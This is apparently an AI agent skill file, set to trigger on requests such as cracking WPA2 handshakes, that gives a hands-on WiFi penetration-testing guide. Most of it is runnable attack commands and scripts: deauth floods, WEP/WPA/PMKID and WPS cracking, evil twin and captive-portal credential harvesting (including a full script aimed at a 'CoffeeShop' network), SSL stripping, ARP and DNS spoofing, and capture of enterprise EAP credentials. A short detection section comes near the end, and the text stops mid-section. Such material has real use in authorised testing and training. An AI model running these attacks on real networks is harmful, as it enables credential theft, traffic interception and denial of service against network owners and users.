---
name: wireless-security-wifi-penetration-testing
description: Hands-on wireless security & WiFi penetration testing with aircrack-ng suite for 802.11, WEP/WPA/WPA2/WPA3 attacks
triggers:
  - "how do I crack a WPA2 handshake"
  - "capture WiFi handshake with aircrack"
  - "set up monitor mode on wireless adapter"
  - "perform deauth attack on access point"
  - "crack WEP encryption with airodump"
  - "set up evil twin access point"
  - "test wireless network security"
  - "capture PMKID for WPA cracking"
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides comprehensive knowledge for wireless security assessment and WiFi penetration testing using the aircrack-ng suite and related tools. It covers 802.11 wireless fundamentals, adapter configuration for monitor mode and packet injection, reconnaissance, traffic analysis, WEP/WPA/WPA2/WPA3 cracking, rogue access points, and enterprise wireless (EAP/RADIUS) assessment.

## Overview

The armourinfosec/Wireless-Security-and-WiFi-Penetration-Testing project is an open educational resource (CC BY 4.0) that provides hands-on study notes and lab exercises for wireless penetration testing. It focuses on practical, reproducible techniques for ethical hacking and security assessment of 802.11 networks.

**Key capabilities:**
- Wireless adapter configuration for monitor mode and packet injection
- Network reconnaissance and hidden SSID discovery
- WEP cracking using multiple attack vectors
- WPA/WPA2 handshake and PMKID capture and cracking
- WPA3 and advanced TKIP attacks
- Evil twin and rogue access point deployment
- Wireless Man-in-the-Middle attacks
- Enterprise WPA (EAP/RADIUS) assessment

## Prerequisites

### Hardware Requirements

**Essential:**
- Injection-capable wireless adapter (Atheros AR9271 or Ralink RT3070/RT5372 chipset)
- Test access point you own (with WEP/WPA/WPA2 capabilities)
- Client device(s) for testing

**Recommended adapters:**
- Alfa AWUS036NHA (Atheros AR9271)
- TP-Link TL-WN722N v1 only (v2/v3 use Realtek, not injection-capable)
- Panda PAU09 (Ralink RT5372)

### Software Requirements

**Base OS:** Kali Linux (or Debian/Ubuntu with wireless tools installed)

```bash
# Verify Kali is up to date
sudo apt update && sudo apt upgrade -y

# Core wireless tooling (most pre-installed on Kali)
sudo apt install -y aircrack-ng \
    wireshark \
    tcpdump \
    hostapd \
    dnsmasq \
    hashcat \
    hcxdumptool \
    hcxtools \
    reaver \
    bully \
    kismet \
    wifite
```

## Wireless Adapter Setup

### Verify Adapter Chipset

```bash
# List USB devices and identify chipset
lsusb

# Check adapter interface
iwconfig

# Verify kernel driver
lsmod | grep 80211
```

### Enable Monitor Mode

```bash
# Check current wireless interfaces
iwconfig

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor mode (should show wlan0mon)
iwconfig

# Alternative manual method
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### Test Packet Injection

```bash
# Test injection capability
sudo aireplay-ng --test wlan0mon

# Expected output should show injection working
# "Injection is working!" with successful packet counts
```

### Set Regulatory Domain

```bash
# Set regulatory domain (US example)
sudo iw reg set US

# Verify
iw reg get

# View available channels
iwlist wlan0mon channel
```

## Wireless Reconnaissance

### Basic Network Discovery

```bash
# Scan all channels and capture to file
sudo airodump-ng wlan0mon

# Target specific channel (e.g., channel 6)
sudo airodump-ng -c 6 wlan0mon

# Write capture to file
sudo airodump-ng -c 6 -w capture wlan0mon

# Scan specific BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target wlan0mon
```

### Hidden SSID Discovery

```bash
# Capture on target channel with hidden SSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w hidden wlan0mon

# In new terminal, send deauth to force reconnection (reveals SSID)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Advanced Scanning with Kismet

```bash
# Start Kismet (opens web interface at http://localhost:2501)
sudo kismet

# Command-line scanning
sudo kismet -c wlan0mon

# Write to pcap
sudo kismet -c wlan0mon -t scan_results
```

## WEP Cracking

### Fake Authentication Attack

```bash
# Capture IVs on target network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# In new terminal, fake authenticate
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h DE:AD:BE:EF:CA:FE wlan0mon

# Generate traffic with ARP replay
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h DE:AD:BE:EF:CA:FE wlan0mon
```

### Crack WEP Key

```bash
# Need ~40,000-85,000 IVs for 64-bit WEP
# Need ~200,000+ IVs for 128-bit WEP

# Crack using captured IVs
sudo aircrack-ng wep_capture-01.cap

# Specify key length if known
sudo aircrack-ng -n 64 wep_capture-01.cap  # 64-bit
sudo aircrack-ng -n 128 wep_capture-01.cap # 128-bit
```

### Chop-Chop Attack

```bash
# Capture IVs
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w chopchop wlan0mon

# Execute chop-chop attack
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -h DE:AD:BE:EF:CA:FE wlan0mon

# Creates .xor file, forge packet
sudo packetforge-ng --arp -a AA:BB:CC:DD:EE:FF -h DE:AD:BE:EF:CA:FE \
    -k 192.168.1.1 -l 192.168.1.100 -y replay*.xor -w forge.cap

# Inject forged packet
sudo aireplay-ng --interactive -r forge.cap wlan0mon
```

## WPA/WPA2 Attacks

### Capture 4-Way Handshake

```bash
# Start capture on target
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# In new terminal, deauth a client to force reconnection
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Verify handshake captured (check airodump-ng output for "WPA handshake")
```

### Crack with Aircrack-ng

```bash
# Dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Specify ESSID if multiple networks in capture
sudo aircrack-ng -w wordlist.txt -e "TargetSSID" handshake-01.cap

# Show only ESSID list
sudo aircrack-ng handshake-01.cap
```

### PMKID Attack (Hashless Capture)

```bash
# Capture PMKID using hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack with hashcat (mode 22000 for WPA-PMKID-PBKDF2)
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Hashcat with rules
hashcat -m 22000 pmkid.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

### GPU-Accelerated Cracking

```bash
# Convert cap to hccapx for older hashcat (deprecated)
# Use hc22000 format for modern hashcat

# WPA/WPA2 cracking with hashcat
hashcat -m 22000 -a 0 handshake.hc22000 /usr/share/wordlists/rockyou.txt

# Mask attack (8-digit numeric password)
hashcat -m 22000 -a 3 handshake.hc22000 ?d?d?d?d?d?d?d?d

# Combination attack
hashcat -m 22000 -a 1 handshake.hc22000 wordlist1.txt wordlist2.txt

# Show cracked results
hashcat -m 22000 handshake.hc22000 --show
```

### Cowpatty with Precomputed Tables

```bash
# Generate rainbow table for specific SSID
genpmk -f wordlist.txt -d pmk_table.dat -s "TargetSSID"

# Crack using precomputed table
cowpatty -r handshake-01.cap -d pmk_table.dat -s "TargetSSID"

# Pyrit example (if installed)
pyrit -r handshake-01.cap -i wordlist.txt attack_passthrough
```

## WPS Attacks

### Scan for WPS-Enabled Networks

```bash
# Scan with wash
sudo wash -i wlan0mon

# Detailed scan
sudo wash -i wlan0mon -C
```

### Reaver WPS PIN Attack

```bash
# Basic reaver attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Aggressive attack with delay
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 1 -T 0.5 -c 6

# Save session for resume
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -s session.wpc

# Resume session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -s session.wpc
```

### Bully WPS Attack

```bash
# Bully attack
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6

# With verbosity
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3
```

## Evil Twin / Rogue Access Point

### Basic Evil Twin with Hostapd

```bash
# Create hostapd configuration
cat > evil_twin.conf << EOF
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
EOF

# Start hostapd
sudo hostapd evil_twin.conf
```

### Evil Twin with Internet Sharing

```bash
# Setup network bridge
sudo ip link add name br0 type bridge
sudo ip link set dev wlan0 master br0
sudo ip link set dev eth0 master br0
sudo ip link set dev br0 up

# Configure DHCP with dnsmasq
cat > dnsmasq_evil.conf << EOF
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Assign IP to wlan0
sudo ip addr add 192.168.10.1/24 dev wlan0

# Start dnsmasq
sudo dnsmasq -C dnsmasq_evil.conf -d

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Setup NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT

# In another terminal, start hostapd
sudo hostapd evil_twin.conf
```

### Captive Portal Attack

```bash
# Using wifiphisher
sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade

# Using WiFi-Pumpkin3
sudo wp3 --interface wlan0 --target-ssid "CoffeeShop"

# Custom captive portal with Apache
# Setup portal page
sudo mkdir -p /var/www/html/portal
sudo cp captive_portal.html /var/www/html/portal/index.html

# Redirect all HTTP to portal
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \
    -j DNAT --to-destination 192.168.10.1:80
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 \
    -j DNAT --to-destination 192.168.10.1:80
```

## Wireless MITM

### Deauthentication Attack

```bash
# Deauth all clients on target AP
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Targeted deauth with reason code
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 -r 7 wlan0mon
```

### Traffic Interception with Bettercap

```bash
# Start bettercap on bridge interface
sudo bettercap -iface wlan0

# Inside bettercap console
# Enable WiFi recon
wifi.recon on

# Show discovered networks
wifi.show

# ARP spoofing
set arp.spoof.targets 192.168.10.50
arp.spoof on

# Sniff credentials
net.sniff on

# HTTP/HTTPS proxy
set http.proxy.sslstrip true
set http.proxy.script /path/to/script.js
http.proxy on
https.proxy on

# DNS spoofing
set dns.spoof.domains example.com
set dns.spoof.address 192.168.10.1
dns.spoof on
```

### SSL Strip Attack

```bash
# Setup SSL strip
sudo sslstrip -l 8080 -w sslstrip.log

# Redirect traffic to sslstrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Monitor captured credentials
tail -f sslstrip.log
```

## Enterprise WPA (EAP/RADIUS) Assessment

### Hostapd-WPE for Credential Capture

```bash
# Install hostapd-wpe
sudo apt install hostapd-wpe

# Configure hostapd-wpe
cat > hostapd-wpe.conf << EOF
interface=wlan0
driver=nl80211
ssid=CorpWiFi
hw_mode=g
channel=6
auth_algs=3
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=
dh_file=/etc/hostapd-wpe/certs/dh
EOF

# Start hostapd-wpe
sudo hostapd-wpe hostapd-wpe.conf

# Captured hashes appear in /var/log/hostapd-wpe.log
# Or in terminal output

# Crack captured MSCHAP challenges
hashcat -m 5500 mschap_hash.txt wordlist.txt
```

### EAP Method Enumeration

```bash
# Use eaphammer to enumerate EAP methods
sudo ./eaphammer --interface wlan0 --channel 6 --essid CorpWiFi \
    --creds --negotiate downgrade

# Identify weak EAP configurations
sudo airodump-ng wlan0mon --wps --manufacturer --band abg
```

## WPA3 Attacks

### Dragonblood Downgrade Attack

```bash
# Force downgrade to WPA2
# Modify hostapd config for evil twin
cat > wpa3_downgrade.conf << EOF
interface=wlan0
ssid=SecureNetwork
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=SAE WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
sae_require_mfp=0
EOF

sudo hostapd wpa3_downgrade.conf
```

### SAE (WPA3) Handshake Capture

```bash
# Capture WPA3 SAE handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa3_capture wlan0mon

# Convert to hashcat format (requires hcxpcapngtool)
hcxpcapngtool -o wpa3.hc22000 wpa3_capture-01.cap

# Attempt dictionary attack (still resistant but possible with weak password)
hashcat -m 22000 wpa3.hc22000 wordlist.txt
```

## Traffic Analysis

### Wireshark Wireless Filtering

```bash
# Launch wireshark with monitor interface
sudo wireshark -i wlan0mon

# Common display filters:
# Show only beacons
wlan.fc.type_subtype == 0x08

# Show only data frames
wlan.fc.type == 0x02

# Show only deauth frames
wlan.fc.type_subtype == 0x0c

# Filter by BSSID
wlan.bssid == aa:bb:cc:dd:ee:ff

# Filter by ESSID
wlan.ssid == "NetworkName"

# Show EAPOL (handshake) frames
eapol
```

### Extract Handshake with Tshark

```bash
# Extract EAPOL frames
tshark -r capture.cap -Y eapol -w handshake_only.cap

# Display handshake details
tshark -r handshake_only.cap -V

# Export specific fields
tshark -r capture.cap -Y eapol -T fields -e wlan.bssid -e wlan.sa -e wlan.da
```

## Automated Tools

### Wifite2

```bash
# Automated wireless auditing
sudo wifite

# Target specific network
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# WPS-only attacks
sudo wifite --wps

# WPA-only attacks
sudo wifite --wpa

# Crack with custom wordlist
sudo wifite --dict /path/to/wordlist.txt

# Set timeout and power level
sudo wifite --kill --power 20 --timeout 600
```

### Airgeddon

```bash
# Download and run airgeddon
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh

# Interactive menu-driven tool
# Follow on-screen prompts for:
# - DoS attacks
# - Handshake capture
# - Evil twin attacks
# - WPS attacks
```

## Detection and Defense

### Detect Rogue APs

```bash
# Continuous monitoring with Kismet
sudo kismet -c wlan0mon

# Use Kismet alerting for rogue AP detection
# Configure alerts in kismet.conf or web UI

# Detect using airodump-ng
# Compare BSSIDs and channels to known-good list
sudo airodump-ng wlan0mon -w baseline --output-format csv

# Alert on unexpected BSSID for known ESSID
```

### Detect Deauth Attacks

```bash
# Monitor for excessive deauth frames
sudo tcpdump -i wlan0mon -e -s 256 type mgt subtype deauth

# Count deauth frames in capture
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x0c" | wc -l

# Kismet IDS alert configuration
# Edit kismet_alerts.conf
alert=DEAUTHFLOOD,Deauthentication flood detected,10,deauth,10,30,100
```

### Enable 802.11w Management Frame Protection

```bash
# For hostapd, add to config:
ieee80211w=2  # 0=disabled, 1=optional, 2=required

# For wpa_supplicant client:
network={
    ssid="SecureNetwork"
    psk="passphrase"
    ieee80211w=2
}
```

## Common Patterns

### Complete WPA2 Assessment Workflow

```bash
#!/bin/bash
# wpa2_assessment.sh

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"
OUTPUT_PREFIX="target_capture"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# 1. Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Start capture
sudo airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID \
    -w $OUTPUT_PREFIX wlan0mon &
AIRODUMP_PID=$!

sleep 5

# 3. Deauth to capture handshake
sudo aireplay-ng --deauth 10 -a $TARGET_BSSID wlan0mon

sleep 30

# 4. Stop capture
sudo kill $AIRODUMP_PID

# 5. Verify handshake
if sudo aircrack-ng ${OUTPUT_PREFIX}-01.cap | grep -q "1 handshake"; then
    echo "[+] Handshake captured!"
    
    # 6. Crack with aircrack-ng
    sudo aircrack-ng -w $WORDLIST ${OUTPUT_PREFIX}-01.cap
else
    echo "[-] No handshake captured. Retry."
fi

# 7. Disable monitor mode
sudo airmon-ng stop wlan0mon
```

### PMKID Capture and Crack Script

```bash
#!/bin/bash
# pmkid_attack.sh

INTERFACE="wlan0mon"
OUTPUT_FILE="pmkid_capture.pcapng"
HASH_FILE="pmkid.hc22000"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# 1. Capture PMKID
echo "[*] Starting PMKID capture (Ctrl+C after 2-3 minutes)"
sudo hcxdumptool -i $INTERFACE -o $OUTPUT_FILE --enable_status=1

# 2. Convert to hashcat format
echo "[*] Converting capture to hashcat format"
hcxpcapngtool -o $HASH_FILE $OUTPUT_FILE

# 3. Check if PMKIDs found
PMKID_COUNT=$(wc -l < $HASH_FILE)
if [ $PMKID_COUNT -eq 0 ]; then
    echo "[-] No PMKIDs captured"
    exit 1
fi

echo "[+] Captured $PMKID_COUNT PMKID(s)"

# 4. Crack with hashcat
echo "[*] Starting hashcat attack"
hashcat -m 22000 $HASH_FILE $WORDLIST

# 5. Show results
hashcat -m 22000 $HASH_FILE --show
```

### Evil Twin with Credential Logging

```bash
#!/bin/bash
# evil_twin_full.sh

TARGET_SSID="CoffeeShop"
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"
INTERFACE="wlan0"
LOG_FILE="credentials.log"

# 1. Deauth legitimate AP to force clients to us
sudo aireplay-ng --deauth 0 -a $TARGET_BSSID wlan1mon &
DEAUTH_PID=$!

# 2. Create hostapd config
cat > /tmp/evil_twin.conf << EOF
interface=$INTERFACE
ssid=$TARGET_SSID
channel=$TARGET_CHANNEL
hw_mode=g
auth_algs=1
wpa=0
EOF

# 3. Setup DHCP
sudo ip addr add 192.168.10.1/24 dev $INTERFACE
cat > /tmp/dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
log-queries
log-dhcp
log-facility=/tmp/dnsmasq.log
EOF

# 4. Start dnsmasq
sudo dnsmasq -C /tmp/dnsmasq.conf &
DNSMASQ_PID=$!

# 5. Setup captive portal redirect
sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 \
    -j DNAT --to-destination 192.168.10.1:80
sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 \
    -j DNAT --to-destination 192.168.10.1:80

# 6. Start hostapd
sudo hostapd /tmp/evil_twin.conf &
HOSTAPD_PID=$!

echo "[*] Evil twin running. Press Ctrl+C to stop."
echo "[*] Credentials logged to $LOG_FILE"

# Trap to cleanup
trap cleanup INT

cleanup() {
    echo "[*] Cleaning up..."
    sudo kill $DEAUTH_PID $DNSMASQ_PID $HOSTAPD_PID 2>/dev/null
    sudo iptables -t nat -F
    sudo ip addr del 192.168.10.1/24 dev $INTERFACE 2>/dev/null
    exit 0
}

wait
```

## Troubleshooting

### Adapter Not Entering Monitor Mode

```bash
# Check if adapter is recognized
lsusb
iwconfig

# Kill interfering processes
sudo airmon-ng check kill

# Manually rmmod and modprobe driver
sudo rmmod ath9k_htc  # for Atheros
sudo modprobe ath9k_htc

# Check for rfkill blocks
sudo rfkill list
sudo rfkill unblock all

# Verify monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
iwconfig  # Should show Mode:Monitor
```

### Injection Test Fails

```bash
# Ensure monitor mode is enabled
iwconfig

# Test injection on correct channel
sudo aireplay-ng --test wlan1mon

# If "0/30: 0%" check:
# 1. Distance to AP (get closer)
# 2. Channel match
# 3. Adapter chipset (Realtek often fails)
# 4. USB port (try different port, USB 2.0 preferred)

# Try different injection test
sudo aireplay-ng --test wlan1 wlan0mon
```

### No Handshake Captured

```bash
# Verify clients are connected
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
# Look for "STATION" column

# Deauth specific client
sudo aireplay-ng --deauth 20 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Use different deauth reason code
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -r 7 wlan0mon

# Check capture for handshake
sudo aircrack-ng capture-01.cap
# or
tshark -r capture-01.cap -Y eapol

# If still failing, check:
# - Client is actually connected
# - You're on correct channel
# - Adapter is close enough to AP and client
```

### Hashcat Not Detecting GPU

```bash
# Check GPU recognition
hashcat -I

# Install NVIDIA drivers (if NVIDIA GPU)
sudo apt install nvidia-driver nvidia-cuda-toolkit

# Install AMD drivers (if AMD GPU)
sudo apt install mesa-opencl-icd

# Test with CPU only (slow but works)
hashcat -m 22000 -D 1 hash.hc22000 wordlist.txt

# Force specific device
hashcat -m 22000 -d 1 hash.hc22000 wordlist.txt
```

### Hostapd Won't Start

```bash
# Check for conflicting services
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# Verify interface is not in use
sudo ip link set wlan0 down

# Check hostapd config syntax
sudo hostapd -dd /etc/hostapd/hostapd.conf

# Common errors:
# - Interface already in use (check with `ip link`)
# - Channel not supported (try channel 1, 6, or 11)
# - Driver mismatch (ensure driver=nl80211 in config)
```

### Permission Denied / Operation Not Permitted

```bash
#
